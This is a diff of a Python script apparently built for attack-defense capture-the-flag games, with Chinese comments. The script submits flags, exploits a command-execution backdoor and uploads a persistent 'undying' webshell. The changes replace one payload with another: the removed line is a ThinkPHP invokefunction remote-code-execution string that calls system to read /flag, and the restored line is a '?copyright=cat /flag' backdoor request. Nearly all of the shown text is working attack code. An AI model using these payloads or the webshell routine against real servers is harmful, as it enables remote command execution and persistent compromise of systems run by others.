@@ -71,8 +71,6 @@ def submit(ip, flag_text):  # 提交flag
 
 
 def backdoor_attack(ip, url_path, method, payload):  # 利用命令执行后门漏洞攻击
-    url = ip + url_path +payload
-    print(url)
     try:
         if method == 'get':
             r = requests.get('http://' + ip + url_path + payload, timeout=5)
@@ -140,11 +138,9 @@ def up_shell(ip, url_path, method, passwd):  # 上传不死马
 
 def main():
     ## get方法payload ####
-    #url_path = '/index.php'
-    url_path = '/'
+    url_path = '/index.php'
     method = 'get'
-    # payload = '?copyright=cat /flag'
-    payload = '?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag'
+    payload = '?copyright=cat /flag'
     passwd = 'copyright'
     #####################
     ## post 方法payload ##
